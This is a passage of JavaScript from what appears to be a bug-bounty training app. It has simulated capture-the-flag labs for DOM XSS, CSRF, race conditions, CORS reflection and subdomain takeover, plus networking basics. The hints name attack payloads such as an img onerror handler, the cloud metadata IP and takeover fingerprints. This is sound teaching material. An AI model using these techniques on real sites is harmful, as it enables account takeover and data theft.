  const inp=box.querySelector(".din"),frame=box.querySelector(".frame"),out=box.querySelector(".lab-out");
  box.querySelectorAll(".chip").forEach(ch=>ch.onclick=()=>{const t=document.createElement("textarea");t.innerHTML=ch.dataset.p;inp.value=t.value;});
  let fired=false;
  function run(){
    const frag=inp.value;
    const doc='<!doctype html><meta charset="utf-8"><body style="font:14px system-ui;margin:8px;color:#111">'
      +'<h3 style="margin:.2em 0">My Profile</h3><div id="out"></div>'
      +'<scr'+'ipt>var frag='+JSON.stringify(frag)+';document.getElementById("out").innerHTML="Section: "+frag;<\/scr'+'ipt></body>';
    frame.srcdoc=doc;
    out.innerHTML='Sinking into innerHTML: <span class="hl">'+esc(frag)+'</span>';
  }
  box.querySelector(".run").onclick=run;
  inp.addEventListener("keydown",e=>{if(e.key==="Enter")run();});
  window.addEventListener("message",e=>{
    if(e.data==="dom-xss"&&!fired&&currentLesson===l.id){
      fired=true;
      out.innerHTML='<span class="ok">● DOM XSS executed — no server involved.</span>\nThe vulnerability was entirely in the page\'s JavaScript (the innerHTML sink). Notice the plain &lt;script&gt; chip does NOT fire via innerHTML — but the image/svg event handlers do.';
      flagReveal(out,"FLAG{dom_xss_innerhtml_sink}");markDone(l.id);
    }
  });
  c.appendChild(box);
  const hint=el("details","hintbox");
  hint.innerHTML=`<summary>Need a hint?</summary><div class="hc">Assigning to <code>innerHTML</code> parses HTML but does NOT run <code>&lt;script&gt;</code> tags. It <em>does</em> run inline event handlers, so <code>&lt;img src=x onerror=...&gt;</code> fires. Load that payload.</div>`;
  c.appendChild(hint);
}

/* ---- Lab: CSRF (Module 7) ---- */
function labCsrf(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>account.example — email on file (simulated)</div>
  <div class="lab-body">
    <div class="data-row"><span>logged in as</span><span>victim@example.com</span></div>
    <div class="data-row"><span>email on file</span><span class="email">victim@example.com</span></div>
    <div class="btn-row" style="margin-top:12px">
      <button class="btn ghost tok">CSRF token protection: OFF</button>
      <button class="btn attack">▶ Open attacker's page</button>
    </div>
    <div class="lab-out">The attacker's page hosts a hidden auto-submitting form targeting this account's "change email" endpoint. Your session cookie rides along automatically.</div>
  </div>`;
  const emailEl=box.querySelector(".email"),out=box.querySelector(".lab-out"),tokBtn=box.querySelector(".tok");
  let token=false,fired=false;
  tokBtn.onclick=()=>{token=!token;tokBtn.textContent="CSRF token protection: "+(token?"ON":"OFF");
    emailEl.textContent="victim@example.com";
    out.innerHTML=token?'Protection ON — the server now requires a per-session CSRF token that the attacker\'s cross-site form cannot know.':'Protection OFF — the server only checks the session cookie.';};
  box.querySelector(".attack").onclick=()=>{
    // simulate the attacker page auto-submitting a forged POST via a sandboxed iframe
    const f=document.createElement("iframe");f.sandbox="allow-scripts";f.style.display="none";
    f.srcdoc='<!doctype html><meta charset="utf-8"><body><scr'+'ipt>parent.postMessage("csrf-submit","*");<\/scr'+'ipt></body>';
    document.body.appendChild(f);setTimeout(()=>f.remove(),800);
    out.innerHTML='Victim visited attacker.example … a hidden form auto-submitted POST /account/change-email {email:"attacker@evil.com"} with the victim\'s cookie.';
  };
  window.addEventListener("message",e=>{
    if(e.data==="csrf-submit"&&currentLesson===l.id){
      if(token){
        out.innerHTML='<span class="bad">403 — request rejected.</span> The forged POST had no valid CSRF token, so the server refused it. This is exactly the fix: the attack now fails.';
      } else if(!fired){
        fired=true;
        emailEl.textContent="attacker@evil.com";emailEl.style.color="var(--crit)";
        out.innerHTML='<span class="ok">● Email changed to attacker@evil.com — with zero clicks from the victim.</span>\nThe server accepted the cross-site request because it only checked the session cookie, not a CSRF token. From here the attacker triggers a password reset and owns the account.';
        flagReveal(out,"FLAG{csrf_no_token_state_change}");markDone(l.id);
      }
    }
  });
  c.appendChild(box);
  const hint=el("details","hintbox");
  hint.innerHTML=`<summary>Need a hint?</summary><div class="hc">With protection OFF, click <em>Open attacker's page</em> — the forged request fires automatically and changes the email (that's the bug, capture the flag). Then turn protection ON and try again to watch the CSRF token defeat it.</div>`;
  c.appendChild(hint);
}

/* ---- Lab: race condition (Module 7) ---- */
function labRace(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>wallet.example — gift card GC-100 (simulated)</div>
  <div class="lab-body">
    <div class="data-row"><span>wallet balance</span><span class="bal">€0</span></div>
    <div class="data-row"><span>gift card GC-100</span><span class="gc">unredeemed · €100</span></div>
    <div class="btn-row" style="margin-top:12px">
      <button class="btn norm">Redeem once (normal)</button>
      <button class="btn race">⚡ Fire 10 requests at once</button>
      <button class="chip reset">reset</button>
    </div>
    <div class="lab-out">A gift card should redeem exactly once. The server checks "is it unredeemed?" then credits, then marks it redeemed — three steps with a gap.</div>
  </div>`;
  const balEl=box.querySelector(".bal"),gcEl=box.querySelector(".gc"),out=box.querySelector(".lab-out");
  let bal=0,redeemed=false;
  function upd(){balEl.textContent="€"+bal;gcEl.textContent=redeemed?"redeemed · €100":"unredeemed · €100";}
  box.querySelector(".reset").onclick=()=>{bal=0;redeemed=false;balEl.style.color="";upd();out.textContent="Reset. Gift card is unredeemed again.";};
  box.querySelector(".norm").onclick=()=>{
    if(redeemed){out.innerHTML='<span class="bad">Rejected</span> — gift card already redeemed. (Sequential requests are safe.)';return;}
    redeemed=true;bal+=100;upd();
    out.innerHTML='<span class="ok">Redeemed once</span> — +€100. Try it again and it\'s correctly blocked. Now do it the attacker\'s way.';
  };
  box.querySelector(".race").onclick=()=>{
    if(redeemed&&bal>=100){out.innerHTML='Reset first to try the race from a clean state.';return;}
    // simulate 10 concurrent requests: all read redeemed=false before any writes true
    const snapshot=redeemed;let credited=0;
    for(let i=0;i<10;i++){ if(!snapshot){credited++;} }
    bal+=credited*100;redeemed=true;upd();balEl.style.color="var(--ok)";
    out.innerHTML='<span class="ok">● Race won — '+credited+' requests all passed the "unredeemed?" check before any marked it used.</span>\nYou redeemed a single €100 card '+credited+' times → +€'+(credited*100)+'. In the real world this is Burp\'s turbo-intruder firing parallel requests at a check-then-act gap.';
    flagReveal(out,"FLAG{race_condition_double_spend}");markDone(l.id);
  };
  c.appendChild(box);
  const hint=el("details","hintbox");
  hint.innerHTML=`<summary>Need a hint?</summary><div class="hc">Click <em>Fire 10 requests at once</em>. Because all ten read "unredeemed" simultaneously — before any writes "redeemed" — they all get credited. That's the check-then-act window.</div>`;
  c.appendChild(hint);
}

/* ---- Lab: CORS misconfiguration (Module 8) ---- */
function labCors(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>GET /api/me — cross-origin probe (simulated)</div>
  <div class="lab-body">
    <label>Origin header to send</label>
    <input type="text" class="org" value="https://evil.com" spellcheck="false">
    <div class="chips">
      <span class="chip">https://evil.com</span>
      <span class="chip">null</span>
      <span class="chip">https://app.example.com</span>
    </div>
    <div class="btn-row"><button class="btn send">▶ Send request</button></div>
    <div class="lab-out">Send different origins and read the response's CORS headers. Can an attacker's site read the victim's data?</div>
  </div>`;
  const org=box.querySelector(".org"),out=box.querySelector(".lab-out");
  box.querySelectorAll(".chip").forEach(ch=>ch.onclick=()=>org.value=ch.textContent);
  box.querySelector(".send").onclick=()=>{
    const o=org.value.trim();
    // vulnerable server: reflects any origin + allows credentials
    let html='<span class="ok">HTTP 200 OK</span>\n';
    html+='<div class="data-row"><span>Access-Control-Allow-Origin</span><span class="hl">'+esc(o)+'</span></div>';
    html+='<div class="data-row"><span>Access-Control-Allow-Credentials</span><span class="hl">true</span></div>';
    html+='<div class="data-row"><span>body</span><span>{"email":"victim@example.com","apiKey":"sk_live_…"}</span></div>\n';
    if(o==="https://app.example.com"){
      html+='That\'s the app\'s own origin — expected. Try an origin an attacker controls.';
      out.innerHTML=html;
    } else {
      html+='<span class="ok">● Exploitable.</span> The server reflected <strong>'+esc(o)+'</strong> AND allows credentials — so a page on '+esc(o)+' can read a logged-in victim\'s private response.';
      out.innerHTML=html;flagReveal(out,"FLAG{cors_origin_reflection}");markDone(l.id);
    }
  };
  c.appendChild(box);
  const hint=el("details","hintbox");
  hint.innerHTML=`<summary>Need a hint?</summary><div class="hc">Send <code>https://evil.com</code> or <code>null</code>. The server echoes your Origin into <code>Access-Control-Allow-Origin</code> and sets <code>Allow-Credentials: true</code> — meaning any site can read the victim's authenticated data. That combination is the bug.</div>`;
  c.appendChild(hint);
}

/* ---- Lab: subdomain takeover (Module 8) ---- */
function labTakeover(l,c){
  const rows=[
    {sub:"www.example.com",cname:"example.com",body:"200 OK — main site",vuln:false},
    {sub:"shop.example.com",cname:"shops.myshopify.com",body:"200 OK — Shopify store (claimed)",vuln:false},
    {sub:"blog.example.com",cname:"example-blog.s3.amazonaws.com",body:"404 — NoSuchBucket: The specified bucket does not exist",vuln:true},
    {sub:"cdn.example.com",cname:"d1a2b3c4.cloudfront.net",body:"200 OK — cached assets",vuln:false},
    {sub:"status.example.com",cname:"example-status.herokuapp.com",body:"404 — No such app. There's nothing here, yet.",vuln:true},
    {sub:"docs.example.com",cname:"example.github.io",body:"404 — There isn't a GitHub Pages site here.",vuln:true}
  ];
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>recon output — click a vulnerable subdomain</div>
  <div class="lab-body"><div class="tk-list"></div>
    <div class="lab-out" style="margin-top:12px">Match each CNAME + response to a dangling-service fingerprint. A claimed, live service is safe; an unclaimed one you can register is a takeover.</div></div>`;
  const list=box.querySelector(".tk-list"),out=box.querySelector(".lab-out");
  let solved=false;
  rows.forEach(r=>{
    const row=el("button","path-row");row.style.width="100%";
    row.innerHTML='<span class="lt-type" style="width:auto">'+esc(r.sub)+'</span><span class="path-t" style="font-family:var(--mono);font-size:11.5px;color:var(--muted)">CNAME → '+esc(r.cname)+'<br>'+esc(r.body)+'</span>';
    row.onclick=()=>{
      if(r.vuln){
        row.style.borderColor="var(--ok)";
        if(!solved){solved=true;
          out.innerHTML='<span class="ok">● '+esc(r.sub)+' is vulnerable.</span>\nIts CNAME points to a de-provisioned service ("'+esc(r.body.split("—")[1]||r.body)+'"). Register that service name and you serve content on '+esc(r.sub)+'. (There\'s more than one vulnerable host here — but one is enough.)';
          flagReveal(out,"FLAG{dangling_cname_takeover}");markDone(l.id);
        }
      } else {
        row.style.borderColor="var(--crit)";setTimeout(()=>row.style.borderColor="",700);
        out.innerHTML='<span class="bad">'+esc(r.sub)+' is a live, claimed service</span> — not vulnerable. Look for a response that proves the backing service is unclaimed.';
      }
    };
    list.appendChild(row);
  });
  c.appendChild(box);
  const hint=el("details","hintbox");
  hint.innerHTML=`<summary>Need a hint?</summary><div class="hc">Live services return normal pages. Look for error bodies that mean "this service name is unclaimed" — e.g. <code>NoSuchBucket</code> (S3), <code>No such app</code> (Heroku), or <code>There isn't a GitHub Pages site here</code>. Those are registrable → takeover.</div>`;
  c.appendChild(hint);
}

/* ============================================================
   NETWORKING LABS (interactive, local)
   ============================================================ */

/* ---- Lab: OSI layer explorer ---- */
function labOsi(l,c){
  const layers=[
    {n:7,name:"Application",unit:"Data",proto:"HTTP · DNS · TLS · SMTP",hack:"Where ~95% of web bugs live — you spend your career here. Tamper requests, inject payloads, abuse logic."},
    {n:6,name:"Presentation",unit:"Data",proto:"TLS/SSL · encoding · compression",hack:"Encryption & encoding. Burp's TLS interception and your payload encoding tricks operate around here."},
    {n:5,name:"Session",unit:"Data",proto:"Sessions · sockets · state",hack:"Session setup & state — conceptually where session handling and fixation ideas sit."},
    {n:4,name:"Transport",unit:"Segment",proto:"TCP · UDP · ports",hack:"Ports & services. Port scanning (nmap) to find non-web services is Transport-layer recon."},
    {n:3,name:"Network",unit:"Packet",proto:"IP · ICMP · routing",hack:"Addresses & routing. Internal IP ranges, SSRF targets (169.254.169.254) and CIDR scope all live here."},
    {n:2,name:"Data Link",unit:"Frame",proto:"Ethernet · ARP · MAC",hack:"LAN-level (ARP spoofing). Mostly out of scope for remote bounty; key for internal/Wi-Fi pentests."},
    {n:1,name:"Physical",unit:"Bits",proto:"Cables · Wi-Fi · fiber",hack:"The actual signal on the wire. Rarely relevant to web hunting — but it's where the bits really move."}
  ];
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>OSI model — click each layer</div>
  <div class="lab-body"><div class="osi-wrap"><div class="osi-stack"></div><div class="osi-detail">Select a layer to inspect it. Visit all 7 to complete.</div></div>
  <div class="lab-out" style="margin-top:12px">Progress: <span class="osi-count">0</span>/7 layers explored</div></div>`;
  const stack=box.querySelector(".osi-stack"),detail=box.querySelector(".osi-detail"),cnt=box.querySelector(".osi-count"),out=box.querySelector(".lab-out");
  const seen=new Set();
  layers.forEach(ly=>{
    const row=el("button","osi-layer");
    row.innerHTML='<span class="osi-n">L'+ly.n+'</span><span class="osi-name">'+esc(ly.name)+'</span><span class="osi-unit">'+esc(ly.unit)+'</span>';
    row.onclick=()=>{
      stack.querySelectorAll(".osi-layer").forEach(r=>r.classList.remove("sel"));row.classList.add("sel");row.classList.add("seen");
      detail.innerHTML='<div class="osi-d-h">L'+ly.n+' · '+esc(ly.name)+'</div>'
        +'<div class="data-row"><span>data unit</span><span>'+esc(ly.unit)+'</span></div>'
        +'<div class="data-row"><span>protocols</span><span>'+esc(ly.proto)+'</span></div>'
        +'<div class="osi-hack"><strong>Hunter’s interest:</strong> '+esc(ly.hack)+'</div>';
      seen.add(ly.n);cnt.textContent=seen.size;
      if(seen.size===7&&!done.has(l.id)){
        out.innerHTML='<span class="ok">● All 7 layers explored.</span> You now have the mental map every other networking lesson builds on.';
        flagReveal(out,"FLAG{osi_stack_mapped}");markDone(l.id);
      }
    };
    stack.appendChild(row);
  });
  c.appendChild(box);
}

/* ---- Lab: subnet calculator ---- */
function labSubnet(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>IPv4 subnet calculator</div>
  <div class="lab-body">
    <label>IP address / CIDR</label>
    <div class="btn-row" style="margin-bottom:10px">
      <input type="text" class="ip" value="10.0.3.14" style="max-width:170px;margin:0" spellcheck="false">
      <span style="font-family:var(--mono);color:var(--muted)">/</span>
      <input type="number" class="cidr" value="24" min="0" max="32" style="max-width:80px;margin:0">
      <button class="btn calc">Calculate</button>
    </div>
    <div class="chips">
      <span class="chip" data-v="10.0.3.14/24">10.0.3.14/24</span>
      <span class="chip" data-v="192.168.1.0/26">192.168.1.0/26</span>
      <span class="chip" data-v="203.0.113.0/24">203.0.113.0/24 (scope)</span>
      <span class="chip" data-v="169.254.169.254/16">169.254.169.254/16</span>
    </div>
    <div class="lab-out">Enter an address and CIDR, then Calculate.</div>
  </div>`;
  const ipI=box.querySelector(".ip"),cidrI=box.querySelector(".cidr"),out=box.querySelector(".lab-out");
  box.querySelectorAll(".chip").forEach(ch=>ch.onclick=()=>{const[a,b]=ch.dataset.v.split("/");ipI.value=a;cidrI.value=b;});
  const toIp=n=>[Math.floor(n/0x1000000)%256,Math.floor(n/0x10000)%256,Math.floor(n/0x100)%256,n%256].join(".");
  function ipType(p){
    if(p[0]===127)return"Loopback (localhost)";
    if(p[0]===10)return"Private (RFC 1918)";
    if(p[0]===172&&p[1]>=16&&p[1]<=31)return"Private (RFC 1918)";
    if(p[0]===192&&p[1]===168)return"Private (RFC 1918)";
    if(p[0]===169&&p[1]===254)return"Link-local (incl. cloud metadata 169.254.169.254)";
    if(p[0]===0||p[0]>=224)return"Reserved / special";
    return"Public (internet-routable)";
  }
  box.querySelector(".calc").onclick=()=>{
    const p=ipI.value.trim().split(".").map(Number);const cidr=parseInt(cidrI.value,10);
    if(p.length!==4||p.some(o=>isNaN(o)||o<0||o>255)){out.innerHTML='<span class="bad">Invalid IPv4 address.</span> Use four octets 0–255.';return;}
    if(isNaN(cidr)||cidr<0||cidr>32){out.innerHTML='<span class="bad">Invalid CIDR.</span> Use /0 – /32.';return;}
    const ipInt=p[0]*0x1000000+p[1]*0x10000+p[2]*0x100+p[3];
    const block=Math.pow(2,32-cidr);
    const net=Math.floor(ipInt/block)*block;
    const bc=net+block-1;
    const maskInt=cidr===0?0:(0x100000000-block);
    const wildInt=block-1;
    let first,last,hosts;
    if(cidr<=30){first=net+1;last=bc-1;hosts=block-2;}
    else if(cidr===31){first=net;last=bc;hosts=2;}
    else{first=net;last=net;hosts=1;}
    out.innerHTML='<span class="ok">'+esc(ipI.value.trim())+'/'+cidr+'</span>\n'
      +'<div class="data-row"><span>type</span><span class="hl">'+esc(ipType(p))+'</span></div>'
      +'<div class="data-row"><span>subnet mask</span><span>'+toIp(maskInt)+'</span></div>'
      +'<div class="data-row"><span>wildcard</span><span>'+toIp(wildInt)+'</span></div>'
      +'<div class="data-row"><span>network</span><span>'+toIp(net)+'</span></div>'
      +'<div class="data-row"><span>broadcast</span><span>'+toIp(bc)+'</span></div>'
      +'<div class="data-row"><span>usable range</span><span>'+toIp(first)+' – '+toIp(last)+'</span></div>'
      +'<div class="data-row"><span>usable hosts</span><span>'+hosts.toLocaleString()+'</span></div>';
    if(!done.has(l.id)){flagReveal(out,"FLAG{subnetting_demystified}");markDone(l.id);}
  };
  c.appendChild(box);
  const hint=el("details","hintbox");
  hint.innerHTML=`<summary>What am I looking at?</summary><div class="hc">The <strong>network</strong> address is the subnet's first address, <strong>broadcast</strong> its last; usable hosts sit between. A <code>/24</code> = 256 addresses (254 usable). Reading a <strong>type</strong> of "Private" or "Link-local" in an SSRF response is what proves internal access.</div>`;
  c.appendChild(hint);
}

/* ---- generic stepper used by handshake / dns / journey ---- */
function buildStepper(c,title,steps,onDone,markId){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>${esc(title)}</div>
  <div class="lab-body"><div class="step-track"></div><div class="step-box"></div>
    <div class="btn-row" style="margin-top:12px"><button class="btn prev ghost">‹ Back</button><button class="btn next">Next step ›</button><button class="chip reset">restart</button></div>
  </div>`;
  const track=box.querySelector(".step-track"),sbox=box.querySelector(".step-box"),prev=box.querySelector(".prev"),next=box.querySelector(".next");
  let i=0;
  steps.forEach((s,si)=>{const d=el("span","step-dot");d.textContent=si+1;track.appendChild(d);});
  function draw(){
    track.querySelectorAll(".step-dot").forEach((d,di)=>{d.classList.toggle("on",di<=i);d.classList.toggle("cur",di===i);});
    const s=steps[i];
    sbox.innerHTML='<div class="step-h">'+esc(s.h)+'</div><div class="step-body">'+s.b+'</div>';
    prev.disabled=i===0;
    next.textContent=i===steps.length-1?"Done ✓":"Next step ›";
    if(i===steps.length-1&&markId&&!done.has(markId)){onDone&&onDone(sbox);}
  }
  next.onclick=()=>{if(i<steps.length-1){i++;draw();}else{if(markId)markDone(markId);}};
  prev.onclick=()=>{if(i>0){i--;draw();}};
  box.querySelector(".reset").onclick=()=>{i=0;draw();};
  c.appendChild(box);
  draw();
  return box;
}

/* ---- Lab: TCP handshake + ports ---- */
function labPorts(l,c){
  const steps=[
    {h:"Idle — no connection yet",b:'The client wants to reach the server on a port (say 443). Nothing has been sent. TCP must establish a connection before any HTTP byte flows.'},
    {h:"1 · SYN →",b:'Client → Server: <code>SYN</code> (seq=x). "I want to open a connection, here\'s my starting sequence number." <br><span style="color:var(--muted)">A port scanner sends exactly this to probe if a port is open.</span>'},
    {h:"2 · ← SYN-ACK",b:'Server → Client: <code>SYN-ACK</code> (seq=y, ack=x+1). "OK, I\'m here, here\'s my sequence number and I acknowledge yours." <br><span style="color:var(--muted)">Getting this back = the port is OPEN.</span>'},
    {h:"3 · ACK →",b:'Client → Server: <code>ACK</code> (ack=y+1). "Confirmed." The three-way handshake is complete.'},
    {h:"✓ ESTABLISHED",b:'The TCP connection is open. <strong>Now</strong> HTTP (or TLS, then HTTP) data can flow. Everything you do in Burp rides on top of a connection that started exactly like this.'}
  ];
  buildStepper(c,"TCP three-way handshake",steps,(sbox)=>{
    flagReveal(sbox,"FLAG{tcp_handshake_established}");markDone(l.id);
  },l.id);
  // port reference
  const ports=[
    ["20/21","FTP","File transfer — creds often in cleartext; anonymous login worth checking."],
    ["22","SSH","Remote shell. Exposed = note it; weak creds / old versions matter."],
    ["23","Telnet","Unencrypted remote shell — a finding just by existing."],
    ["25/465/587","SMTP","Mail. Open relays, SPF/DMARC issues."],
    ["53","DNS","Name resolution. Zone transfers (AXFR) can dump every record."],
    ["80","HTTP","Web, cleartext. Should usually redirect to 443."],
    ["110/143","POP3/IMAP","Mail retrieval."],
    ["443","HTTPS","Web over TLS — your main battlefield."],
    ["3306","MySQL","Database. Exposed to internet = likely critical."],
    ["3389","RDP","Windows remote desktop. High-value if exposed."],
    ["5432","PostgreSQL","Database — same story as 3306."],
    ["6379","Redis","Often no auth by default — exposed Redis is a classic win."],
    ["8080/8000","HTTP-alt","Dev servers, proxies, admin panels hide here."],
    ["8443","HTTPS-alt","Alternate TLS — admin / management consoles."],
    ["9200","Elasticsearch","Exposed = data exposure / RCE risk."],
    ["27017","MongoDB","Historically unauthenticated — mass data leaks."]
  ];
  const pbox=el("div","lab");
  pbox.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>common ports — recon reference</div>
  <div class="lab-body"><input type="text" class="ports-search" placeholder="search port or service… (e.g. 6379, redis, database)" style="width:100%;font-family:var(--mono);font-size:13px;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:8px;padding:9px 11px;margin-bottom:10px">
  <div class="ports-list"></div></div>`;
  const ps=pbox.querySelector(".ports-search"),pl=pbox.querySelector(".ports-list");
  function drawPorts(q){
    q=(q||"").toLowerCase();pl.innerHTML="";
    ports.filter(p=>!q||(p[0]+" "+p[1]+" "+p[2]).toLowerCase().includes(q)).forEach(p=>{
      const r=el("div","port-row");
      r.innerHTML='<span class="port-n">'+esc(p[0])+'</span><span class="port-s">'+esc(p[1])+'</span><span class="port-d">'+esc(p[2])+'</span>';
      pl.appendChild(r);
    });
    if(!pl.children.length)pl.innerHTML='<p style="color:var(--muted);margin:4px">No match.</p>';
  }
  ps.addEventListener("input",()=>drawPorts(ps.value));drawPorts("");
  c.appendChild(pbox);
}

/* ---- Lab: DNS resolution walkthrough ---- */
function labDns(l,c){
  const steps=[
    {h:"You type shop.example.com",b:'Your browser needs an IP address to connect. It has none cached, so it asks its <strong>recursive resolver</strong> (e.g. 8.8.8.8 or your ISP\'s).'},
    {h:"Resolver → Root server",b:'Resolver asks a <strong>root</strong> server: "who handles <code>.com</code>?" Root replies with the <code>.com</code> TLD nameservers. (13 root server clusters anchor the whole system.)'},
    {h:"Resolver → .com TLD server",b:'Resolver asks the <code>.com</code> <strong>TLD</strong> server: "who\'s authoritative for <code>example.com</code>?" It replies with example.com\'s <strong>NS</strong> records (its authoritative nameservers).'},
    {h:"Resolver → Authoritative server",b:'Resolver asks example.com\'s <strong>authoritative</strong> server: "what\'s the A record for <code>shop.example.com</code>?" <br><span style="color:var(--muted)">This server holds the real records — and leaks subdomains to anyone enumerating.</span>'},
    {h:"✓ Answer: 203.0.113.42",b:'Authoritative server returns <code>shop.example.com → 203.0.113.42</code>. The resolver caches it for the TTL and hands it to your browser, which can now open a TCP connection. <br><strong>Recon tie-in:</strong> CT logs + brute-force against this hierarchy are how you find <code>staging.</code>, <code>admin.</code>, <code>vpn.</code> — your attack surface.'}
  ];
  buildStepper(c,"DNS resolution — shop.example.com",steps,(sbox)=>{
    flagReveal(sbox,"FLAG{dns_resolution_traced}");markDone(l.id);
  },l.id);
}

/* ---- Lab: trace a request end-to-end ---- */
function labJourney(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>trace a request</div>
  <div class="lab-body">
    <label>URL to fetch</label>
    <input type="text" class="jurl" value="https://shop.example.com/cart" spellcheck="false">
    <div class="btn-row"><button class="btn go">▶ Trace it</button></div>
    <div class="journey-host" style="margin-top:12px"></div>
  </div>`;
  const urlI=box.querySelector(".jurl"),host=box.querySelector(".journey-host");
  box.querySelector(".go").onclick=()=>{
    let u;try{u=new URL(urlI.value.trim());}catch(e){host.innerHTML='<div class="lab-out"><span class="bad">Invalid URL.</span> Include https://</div>';return;}
    const h=u.hostname,https=u.protocol==="https:",port=u.port||(https?"443":"80");
    const steps=[
      {h:"L7 · DNS resolve "+esc(h),b:'The browser resolves <code>'+esc(h)+'</code> to an IP via the DNS hierarchy (root → TLD → authoritative). Say it returns <code>203.0.113.42</code>. <br><span style="color:var(--muted)">Hunter: this is where subdomain recon and takeover live.</span>'},
      {h:"L4/L3 · TCP handshake → "+esc(h)+":"+port,b:'SYN → SYN-ACK → ACK to <code>203.0.113.42:'+port+'</code>. A TCP connection is now open. <br><span style="color:var(--muted)">Hunter: an open non-standard port here is attack surface.</span>'},
      https?{h:"L6 · TLS handshake",b:'Client hello → server hello + certificate → verify against trusted CAs → shared key. An encrypted tunnel is up. <br><span style="color:var(--muted)">Hunter: because you trust <strong>Burp\'s</strong> CA on your box, Burp reads inside this tunnel.</span>'}:{h:"L6 · (no TLS — plain HTTP)",b:'This is <code>http://</code>, so traffic is cleartext — anyone on-path can read it. That itself is often a reportable issue.'},
      {h:"L7 · HTTP request",b:'<pre style="margin:0;background:var(--bg);border:1px solid var(--border-soft);border-radius:7px;padding:9px"><code>GET '+esc(u.pathname)+' HTTP/2\nHost: '+esc(h)+'\nCookie: session=…</code></pre><span style="color:var(--muted)">Hunter: THIS is what you tamper in Burp — method, path, headers, cookies, body.</span>'},
      {h:"✓ Response comes back",b:'The server processes the request and returns a status + headers + body, back down through TLS → TCP → IP to your browser, which renders it. <br><strong>The entire round trip you just traced is the surface you test.</strong>'}
    ];
    host.innerHTML="";
    buildStepper(host,"journey: "+h,steps,(sbox)=>{flagReveal(sbox,"FLAG{request_journey_traced}");markDone(l.id);},l.id);
  };
  c.appendChild(box);
}

/* ============================================================
   SPECIALIZATION  (go deep on one lane)
   ============================================================ */
const SPEC_LS="firstbounty.spec";
const SPECIALTIES=[
  {id:"access",rec:true,name:"Access Control & Data Exposure",
   tagline:"The #1 beginner money lane. High-frequency, low-competition, and it plays to your SOC brain.",
   classes:["IDOR","Mass assignment","Info disclosure","Subdomain takeover"],
   lessons:["0.3","2.1","2.3","3.1","3.2","3.3","3.5","8.1","8.2","8.5","9.1","9.2"]},
  {id:"xss",rec:false,name:"Cross-Site Scripting",
   tagline:"Go deep on injecting the browser: reflected, DOM, stored, and the CORS data-theft cousin.",
   classes:["Reflected XSS","DOM XSS","Stored XSS","CORS"],
   lessons:["1.1","1.2","2.1","4.1","4.2","4.3","4.5","8.4","9.1"]},
  {id:"logic",rec:false,name:"Auth & Business Logic",
   tagline:"The creative bugs scanners can't touch — auth bypass, JWT, CSRF, and race conditions.",
   classes:["Broken auth","JWT","CSRF","Race conditions"],
   lessons:["1.1","3.3","7.1","7.2","7.3","7.5","7.6","9.1"]}
];
function specById(id){return SPECIALTIES.find(s=>s.id===id);}
function specPct(s){const ls=s.lessons.filter(id=>ALL.find(x=>x.id===id));const d=ls.filter(id=>done.has(id)).length;return ls.length?Math.round(d/ls.length*100):0;}
function renderSpecPanel(host){
  if(!host)return;
  const cur=lsGetStr(SPEC_LS);const s=cur&&specById(cur);
  host.innerHTML="";
  if(!s){
    host.appendChild(el("div","section-label",esc(t("sec.specChoose"))));
    host.appendChild(el("p","spec-intro",esc(t("spec.intro"))));
    const grid=el("div","spec-grid");
    SPECIALTIES.forEach(sp=>{
      const card=el("button","spec-card"+(sp.rec?" rec":""));
      card.innerHTML=(sp.rec?'<span class="spec-badge">'+esc(t("spec.rec"))+'</span>':'')
        +'<h3>'+esc(sp.name)+'</h3><p>'+esc(sp.tagline)+'</p>'
        +'<div class="spec-classes">'+sp.classes.map(x=>'<span class="spec-chip">'+esc(x)+'</span>').join('')+'</div>'
        +'<span class="spec-pick">'+esc(t("spec.pick"))+'</span>';
      card.onclick=()=>{lsSetStr(SPEC_LS,sp.id);renderHome();};
      grid.appendChild(card);
    });
    host.appendChild(grid);
    return;
  }
  const p=specPct(s);
  host.appendChild(el("div","section-label",esc(t("sec.specYour"))));
  const card=el("div","mastery");
  card.innerHTML='<div class="mastery-top">'+ringSVG(p,56)
    +'<div class="mastery-meta"><h3>'+esc(s.name)+'</h3><p>'+esc(s.tagline)+'</p>'
    +'<div class="mastery-bar">'+p+'% '+esc(t("spec.mastered"))+' · '+s.lessons.filter(id=>done.has(id)).length+'/'+s.lessons.length+' '+esc(t("spec.steps"))+'</div></div>'
    +'<button class="btn ghost spec-change">'+esc(t("spec.change"))+'</button></div>';
  host.appendChild(card);
  const steps=el("div","path-steps");
  s.lessons.forEach(id=>{
    const l=ALL.find(x=>x.id===id);if(!l)return;
    const row=el("button","path-row"+(done.has(id)?" done":""));
